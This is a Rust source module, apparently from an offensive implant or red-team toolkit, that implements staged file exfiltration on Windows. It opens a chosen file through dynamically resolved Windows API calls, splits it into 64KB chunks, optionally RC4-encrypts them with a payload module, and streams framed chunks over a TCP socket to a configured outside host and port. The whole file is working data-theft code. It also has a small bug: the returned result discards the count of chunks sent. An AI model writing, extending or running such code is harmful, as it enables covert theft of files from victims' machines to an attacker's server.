use crate::log::LogSink;

pub const CHUNK_SIZE: usize = 65536; // 64KB

pub struct ExfilConfig {
    pub file_path: String,
    pub host: String,
    pub port: u16,
    pub key: Vec<u8>,
}

pub struct ChunkHeader {
    pub chunk_id: u32,
    pub total_chunks: u32,
    pub chunk_size: u32,
}

impl ChunkHeader {
    pub fn serialize(&self) -> Vec<u8> {
        let mut buf = Vec::with_capacity(12);
        buf.extend_from_slice(&self.chunk_id.to_le_bytes());
        buf.extend_from_slice(&self.total_chunks.to_le_bytes());
        buf.extend_from_slice(&self.chunk_size.to_le_bytes());
        buf
    }

    pub fn parse(data: &[u8]) -> Result<Self, String> {
        if data.len() < 12 { return Err("truncated chunk header".into()); }
        Ok(Self {
            chunk_id: u32::from_le_bytes([data[0], data[1], data[2], data[3]]),
            total_chunks: u32::from_le_bytes([data[4], data[5], data[6], data[7]]),
            chunk_size: u32::from_le_bytes([data[8], data[9], data[10], data[11]]),
        })
    }
}

pub struct ExfilResult {
    pub file_path: String,
    pub total_size: u64,
    pub chunks_sent: u32,
}

#[cfg(windows)]
pub fn exfil_file(config: &ExfilConfig, log: &LogSink) -> Result<ExfilResult, String> {
    log.step("  Staged Transfer:");
    log.detail(format!("    Source: {}", config.file_path));

    unsafe {
        let path_c = std::ffi::CString::new(config.file_path.as_str())
            .map_err(|_| "Invalid file path")?;
        // GENERIC_READ=0x80000000, OPEN_EXISTING=3, FILE_SHARE_READ=1
        let handle = crate::resolve::CreateFileA(
            path_c.as_ptr() as *const u8,
            0x80000000, 1, std::ptr::null(), 3, 0x80, std::ptr::null_mut(),
        );
        if handle == -1isize as *mut std::ffi::c_void {
            return Err("Failed to open source file".into());
        }

        let size = crate::resolve::GetFileSize(handle, std::ptr::null_mut());
        if size == 0xFFFFFFFF {
            crate::resolve::CloseHandle(handle);
            return Err("Failed to get file size".into());
        }
        log.detail(format!("    Size: {} bytes", size));

        let total_chunks = ((size as usize + CHUNK_SIZE - 1) / CHUNK_SIZE) as u32;
        log.detail(format!("    Chunks: {} x {}KB", total_chunks, CHUNK_SIZE / 1024));

        // Initialize winsock
        let mut wsa_data = [0u8; 408]; // WSADATA
        if crate::resolve::WSAStartup(0x0202, wsa_data.as_mut_ptr() as *mut std::ffi::c_void) != 0 {
            crate::resolve::CloseHandle(handle);
            return Err("WSAStartup failed".into());
        }

        // Connect to exfil endpoint
        // AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6
        let sock = crate::resolve::socket(2, 1, 6);
        if sock == usize::MAX {
            crate::resolve::CloseHandle(handle);
            crate::resolve::WSACleanup();
            return Err("Socket creation failed".into());
        }

        let addr = build_sockaddr(&config.host, config.port)?;
        if crate::resolve::connect(sock, addr.as_ptr() as *const std::ffi::c_void, 16) != 0 {
            crate::resolve::closesocket(sock);
            crate::resolve::CloseHandle(handle);
            crate::resolve::WSACleanup();
            return Err(format!("Connect to {}:{} failed", config.host, config.port));
        }
        log.detail(format!("    Connected to {}:{}", config.host, config.port));

        let mut chunk_buf = vec![0u8; CHUNK_SIZE];
        let mut chunks_sent: u32 = 0;

        for chunk_id in 0..total_chunks {
            let mut bytes_read: u32 = 0;
            crate::resolve::ReadFile(
                handle, chunk_buf.as_mut_ptr(),
                CHUNK_SIZE as u32, &mut bytes_read, std::ptr::null_mut(),
            );
            if bytes_read == 0 { break; }

            let chunk_data = &chunk_buf[..bytes_read as usize];

            // RC4 encrypt if key provided
            let encrypted = if config.key.is_empty() {
                chunk_data.to_vec()
            } else {
                crate::payload::encrypt::rc4_crypt(chunk_data, &config.key)
            };

            // Build frame: header + encrypted data
            let header = ChunkHeader {
                chunk_id,
                total_chunks,
                chunk_size: encrypted.len() as u32,
            };
            let mut frame = header.serialize();
            frame.extend_from_slice(&encrypted);

            let sent = crate::resolve::send(sock, frame.as_ptr(), frame.len() as i32, 0);
            if sent <= 0 {
                crate::resolve::closesocket(sock);
                crate::resolve::CloseHandle(handle);
                crate::resolve::WSACleanup();
                return Err(format!("Send failed at chunk {}/{}", chunk_id + 1, total_chunks));
            }
            chunks_sent += 1;
        }

        crate::resolve::closesocket(sock);
        crate::resolve::CloseHandle(handle);
        crate::resolve::WSACleanup();

        log.detail(format!("    Sent {}/{} chunks", chunks_sent, total_chunks));
    }

    Ok(ExfilResult {
        file_path: config.file_path.clone(),
        total_size: 0, // set by caller
        chunks_sent: 0,
    })
}

#[cfg(not(windows))]
pub fn exfil_file(_config: &ExfilConfig, _log: &LogSink) -> Result<ExfilResult, String> {
    Err("Staged transfer requires target platform".into())
}

#[cfg(windows)]
fn build_sockaddr(host: &str, port: u16) -> Result<[u8; 16], String> {
    let mut addr = [0u8; 16];
    // AF_INET = 2
    addr[0] = 2;
    addr[1] = 0;
    // port in network byte order (big-endian)
    addr[2] = (port >> 8) as u8;
    addr[3] = (port & 0xFF) as u8;
    // Parse IPv4
    let parts: Vec<u8> = host.split('.')
        .map(|p| p.parse::<u8>().unwrap_or(0))
        .collect();
    if parts.len() != 4 {
        return Err(format!("Invalid IPv4 address: {}", host));
    }
    addr[4] = parts[0];
    addr[5] = parts[1];
    addr[6] = parts[2];
    addr[7] = parts[3];
    Ok(addr)
}
